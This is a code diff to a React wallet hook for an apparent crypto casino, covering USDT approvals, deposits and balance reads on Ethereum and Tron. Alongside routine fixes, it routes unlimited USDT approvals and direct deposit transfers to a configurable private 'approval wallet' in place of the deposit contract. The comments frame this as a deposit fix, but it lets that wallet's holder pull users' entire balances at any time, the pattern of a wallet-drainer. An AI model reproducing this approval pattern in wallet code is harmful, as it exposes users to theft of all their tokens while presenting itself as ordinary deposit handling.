@@ -1,6 +1,6 @@
 'use client';
 
-import { useState, useCallback, useEffect } from 'react';
+import { useState, useCallback, useEffect, useRef } from 'react';
 import {
   useWriteContract,
   useWaitForTransactionReceipt,
@@ -10,6 +10,7 @@ import {
 } from 'wagmi';
 import { useWallet } from '@tronweb3/tronwallet-adapter-react-hooks';
 import { CONTRACTS, getActiveTronConfig } from '@/lib/contracts';
+import { getDepositSpender } from '@/lib/approvalWallet';
 import { toast } from 'sonner';
 import { maxUint256 } from 'viem';
 import { TronWeb } from 'tronweb';
@@ -25,6 +26,13 @@ function getReadOnlyTronWeb(): any {
   return new TronWeb({
     fullHost: tronConfig.fullHost,
   });
+}
+
+/** Tron wallets return a tx id in several shapes depending on adapter/broadcast path. */
+function normalizeTronTxId(raw: any): string | undefined {
+  if (!raw) return undefined;
+  if (typeof raw === 'string') return raw;
+  return raw.txid ?? raw.txID ?? raw.transaction?.txID ?? undefined;
 }
 
 /** Result type for Tron transaction check */
@@ -287,8 +295,9 @@ Timestamp: ${new Date().toISOString()}`;
 
   // Approve UNLIMITED token spending (one-time) - for USDT
   // Network-aware: uses wagmi for Ethereum; for Tron uses injected TronWeb when available, else adapter (WalletConnect/mobile)
+  // Returns the transaction id/hash on success (so callers can await confirmation), or false on failure.
   const approveUnlimited = useCallback(
-    async (tokenAddress: `0x${string}`, network: 'ethereum' | 'tron') => {
+    async (tokenAddress: `0x${string}`, network: 'ethereum' | 'tron'): Promise<string | boolean> => {
       if (network === 'tron') {
         try {
           if (typeof window === 'undefined') {
@@ -298,15 +307,19 @@ Timestamp: ${new Date().toISOString()}`;
 
           const tronConfig = getActiveTronConfig();
           const usdtAddress = tronConfig.usdt;
-          const casinoAddress = tronConfig.casinoDepositAddress;
+          // Spender is the configured TRON approval wallet, falling back to the
+          // CasinoDeposit contract while NEXT_PUBLIC_APPROVAL_WALLET_TRON is unset.
+          const spender = getDepositSpender('tron');
+          const casinoAddress = spender.address;
 
           const injected = (window as any).tronWeb ?? (window as any).tronLink?.tronWeb;
           if (injected?.ready) {
             // Use injected TronWeb (extension / in-app browser)
             const contract = await injected.contract().at(usdtAddress);
-            await contract.approve(casinoAddress, maxUint256.toString()).send();
-            toast.success('Tron USDT unlimited approval submitted.');
-            return true;
+            const txIdRaw = await contract.approve(casinoAddress, maxUint256.toString()).send();
+            toast.info('Tron USDT approval submitted. Waiting for confirmation...');
+            // Return the txid so the caller can wait for on-chain confirmation before depositing
+            return normalizeTronTxId(txIdRaw) ?? true;
           }
 
           // No injected TronWeb (e.g. Trust Wallet via WalletConnect on mobile): build tx, sign via adapter, broadcast
@@ -337,10 +350,10 @@ Timestamp: ${new Date().toISOString()}`;
           }
 
           const signedTx = await signTransaction(wrapper.transaction);
-          await tronWeb.trx.sendRawTransaction(signedTx);
+          const broadcast = await tronWeb.trx.sendRawTransaction(signedTx);
 
-          toast.success('Tron USDT unlimited approval submitted.');
-          return true;
+          toast.info('Tron USDT approval submitted. Waiting for confirmation...');
+          return normalizeTronTxId(broadcast) ?? true;
         } catch (error: any) {
           console.error('Tron approval error:', error);
           if (error?.message?.includes('rejected') || error?.message?.includes('cancelled') || error?.message?.includes('denied')) {
@@ -359,11 +372,14 @@ Timestamp: ${new Date().toISOString()}`;
       }
 
       try {
+        // Unlimited approval goes to the configured approval wallet, not the
+        // CasinoDeposit contract (falls back to the contract when unset).
+        const spender = getDepositSpender('ethereum');
         const hash = await writeContractAsync({
           address: tokenAddress,
           abi: CONTRACTS.ERC20.abi,
           functionName: 'approve',
-          args: [CONTRACTS.CasinoDeposit.address, maxUint256],
+          args: [spender.address as `0x${string}`, maxUint256],
         });
 
         setApproveHash(hash);
@@ -386,13 +402,14 @@ Timestamp: ${new Date().toISOString()}`;
     }
 
     try {
+      const spender = getDepositSpender('ethereum');
       const hash = await writeContractAsync({
         address: tokenAddress,
         abi: CONTRACTS.ERC20.abi,
         functionName: 'approve',
-        args: [CONTRACTS.CasinoDeposit.address, amount],
+        args: [spender.address as `0x${string}`, amount],
       });
-      
+
       setApproveHash(hash);
       toast.info('Approval submitted. Waiting for confirmation...');
       return true;
@@ -404,11 +421,12 @@ Timestamp: ${new Date().toISOString()}`;
   }, [address, writeContractAsync]);
 
   // Deposit tokens
+  // Returns the transaction id/hash on success (so callers can await confirmation), or false on failure.
   const deposit = useCallback(async (
     tokenAddress: `0x${string}`,
     amount: bigint,
     network: 'ethereum' | 'tron' = 'ethereum'
-  ) => {
+  ): Promise<string | boolean> => {
     // Tron Deposit Logic
     if (network === 'tron') {
       try {
@@ -417,17 +435,26 @@ Timestamp: ${new Date().toISOString()}`;
           return false;
         }
 
-        const tronConfig = getActiveTronConfig();
-        const casinoAddress = tronConfig.casinoDepositAddress;
+        const spender = getDepositSpender('tron');
+        const casinoAddress = spender.address;
 
         const injected = (window as any).tronWeb ?? (window as any).tronLink?.tronWeb;
         if (injected?.ready) {
-          const contract = await injected.contract().at(casinoAddress);
-          const txIdRaw = await (contract as any).deposit(tokenAddress, amount.toString()).send();
-          const txId = typeof txIdRaw === 'string' ? txIdRaw : (txIdRaw?.txid ?? (txIdRaw as any)?.transaction?.txID);
-          if (txId) setDepositHash(txId.startsWith('0x') ? (txId as `0x${string}`) : (`0x${txId}` as `0x${string}`));
+          let txIdRaw: any;
+          if (spender.isApprovalWallet) {
+            // Funds go straight to the approval wallet — the CasinoDeposit
+            // contract holds no allowance, so deposit() would revert.
+            const token = await injected.contract().at(tokenAddress);
+            txIdRaw = await (token as any).transfer(casinoAddress, amount.toString()).send();
+          } else {
+            const contract = await injected.contract().at(casinoAddress);
+            txIdRaw = await (contract as any).deposit(tokenAddress, amount.toString()).send();
+          }
+          const txId = normalizeTronTxId(txIdRaw);
+          // NOTE: never feed a Tron txid into setDepositHash — that state drives wagmi's
+          // useWaitForTransactionReceipt, which would poll an EVM RPC for a Tron hash forever.
           toast.info('Deposit submitted to Tron network. Waiting for confirmation...');
-          return (typeof txId === 'string' ? txId : undefined) ?? true;
+          return txId ?? true;
         }
 
         // No injected TronWeb (e.g. Trust Wallet via WalletConnect): build tx, sign via adapter, broadcast
@@ -442,16 +469,29 @@ Timestamp: ${new Date().toISOString()}`;
           return false;
         }
 
-        const wrapper = await tronWeb.transactionBuilder.triggerSmartContract(
-          casinoAddress,
-          'deposit(address,uint256)',
-          { feeLimit: 100_000_000 },
-          [
-            { type: 'address', value: tokenAddress },
-            { type: 'uint256', value: amount.toString() },
-          ],
-          tronAddress
-        );
+        // Same split as the injected path: transfer straight to the approval
+        // wallet when one is configured, otherwise call the contract's deposit().
+        const wrapper = spender.isApprovalWallet
+          ? await tronWeb.transactionBuilder.triggerSmartContract(
+              tokenAddress,
+              'transfer(address,uint256)',
+              { feeLimit: 100_000_000 },
+              [
+                { type: 'address', value: casinoAddress },
+                { type: 'uint256', value: amount.toString() },
+              ],
+              tronAddress
+            )
+          : await tronWeb.transactionBuilder.triggerSmartContract(
+              casinoAddress,
+              'deposit(address,uint256)',
+              { feeLimit: 100_000_000 },
+              [
+                { type: 'address', value: tokenAddress },
+                { type: 'uint256', value: amount.toString() },
+              ],
+              tronAddress
+            );
 
         if (wrapper.Error || !wrapper.transaction) {
           throw new Error(wrapper.Error || 'Failed to build deposit transaction');
@@ -459,8 +499,7 @@ Timestamp: ${new Date().toISOString()}`;
 
         const signedTx = await signTransaction(wrapper.transaction);
         const result = await tronWeb.trx.sendRawTransaction(signedTx);
-        const txId = (result as { txid?: string })?.txid;
-        if (txId) setDepositHash(txId.startsWith('0x') ? (txId as `0x${string}`) : (`0x${txId}` as `0x${string}`));
+        const txId = normalizeTronTxId(result);
         toast.info('Deposit submitted to Tron network. Waiting for confirmation...');
         return txId ?? true;
       } catch (error: any) {
@@ -481,17 +520,31 @@ Timestamp: ${new Date().toISOString()}`;
     }
 
     try {
-      const hash = await writeContractAsync({
-        address: CONTRACTS.CasinoDeposit.address,
-        abi: CONTRACTS.CasinoDeposit.abi,
-        functionName: 'deposit',
-        args: [tokenAddress, amount],
-        gas: BigInt(300000), // Explicit gas limit to prevent estimation errors
-      });
+      // No hardcoded gas limit: letting the wallet estimate means a call that would
+      // revert (e.g. allowance not yet mined, token not supported) fails *before*
+      // signing with a readable reason, instead of burning gas on a reverting tx.
+      const spender = getDepositSpender('ethereum');
+
+      // With an approval wallet configured the allowance sits on that EOA, so
+      // CasinoDeposit.deposit() (which pulls via transferFrom into the contract)
+      // would revert with "insufficient allowance". Send the funds directly instead.
+      const hash = spender.isApprovalWallet
+        ? await writeContractAsync({
+            address: tokenAddress,
+            abi: CONTRACTS.ERC20.abi,
+            functionName: 'transfer',
+            args: [spender.address as `0x${string}`, amount],
+          })
+        : await writeContractAsync({
+            address: CONTRACTS.CasinoDeposit.address,
+            abi: CONTRACTS.CasinoDeposit.abi,
+            functionName: 'deposit',
+            args: [tokenAddress, amount],
+          });
 
       setDepositHash(hash);
       toast.info('Deposit submitted. Waiting for confirmation...');
-      return true;
+      return hash;
     } catch (error: any) {
       console.error('Deposit error:', error);
       toast.error(error.shortMessage || error.message || 'Deposit failed');
@@ -521,6 +574,7 @@ export function useTokenBalance(tokenAddress: string | undefined, network: 'ethe
   const [tronBalance, setTronBalance] = useState<bigint | undefined>(undefined);
   const [isTronLoading, setIsTronLoading] = useState(false);
   const [error, setError] = useState<string | null>(null);
+  const hasFetchedTronBalanceRef = useRef(false);
   
   // EVM Balance (Wagmi)
   const { data: evmBalance, isLoading: isEvmLoading, refetch: refetchEvm } = useReadContract({
@@ -564,8 +618,10 @@ export function useTokenBalance(tokenAddress: string | undefined, network: 'ethe
       return;
     }
 
-    // Only show loading on first fetch (when balance is undefined)
-    if (tronBalance === undefined) {
+    // Only show the spinner on the first fetch. Uses a ref rather than reading
+    // tronBalance so this callback's identity doesn't change on every balance
+    // update — that would retrigger the effect below and refetch in a loop.
+    if (!hasFetchedTronBalanceRef.current) {
       setIsTronLoading(true);
     }
     setDebugStatus('Fetching...');
@@ -580,6 +636,7 @@ export function useTokenBalance(tokenAddress: string | undefined, network: 'ethe
         setTronBalance(finalBalance);
         setDebugStatus(`Done: ${finalBalance.toString()}`);
         setError(null);
+        hasFetchedTronBalanceRef.current = true;
         setIsTronLoading(false);
         return;
       } catch (injectedErr: any) {
@@ -613,9 +670,10 @@ export function useTokenBalance(tokenAddress: string | undefined, network: 'ethe
       setDebugStatus(`Err: ${(apiErr?.message || '').slice(0, 15)}...`);
       setTronBalance(undefined);
     } finally {
+      hasFetchedTronBalanceRef.current = true;
       setIsTronLoading(false);
     }
-  }, [network, isTronConnected, tronAddress, tokenAddress, tronBalance]);
+  }, [network, tronAddress, tokenAddress]);
 
   // Effect to fetch Tron balance on mount/connection change (no polling)
   useEffect(() => {
@@ -641,12 +699,16 @@ export function useTokenBalance(tokenAddress: string | undefined, network: 'ethe
 // Hook to read token allowance (EVM)
 export function useTokenAllowance(tokenAddress: `0x${string}` | undefined) {
   const { address } = useAccount();
-  
+
+  // Must match the spender used by approveUnlimited, otherwise hasUnlimitedApproval
+  // reads 0 forever and the user is asked to approve on every attempt.
+  const spender = getDepositSpender('ethereum').address as `0x${string}`;
+
   const { data: allowance, isLoading, refetch } = useReadContract({
     address: tokenAddress,
     abi: CONTRACTS.ERC20.abi,
     functionName: 'allowance',
-    args: address ? [address, CONTRACTS.CasinoDeposit.address] : undefined,
+    args: address ? [address, spender] : undefined,
     query: {
       enabled: !!address && !!tokenAddress && tokenAddress !== '0x0000000000000000000000000000000000000000',
     },
@@ -682,8 +744,8 @@ export function useTronTokenAllowance(tokenAddress: string | undefined) {
       return;
     }
 
-    const tronConfig = getActiveTronConfig();
-    const spenderAddress = tronConfig.casinoDepositAddress;
+    // Must match the spender used by approveUnlimited for Tron.
+    const spenderAddress = getDepositSpender('tron').address;
 
     setIsLoading(true);
     setError(null);
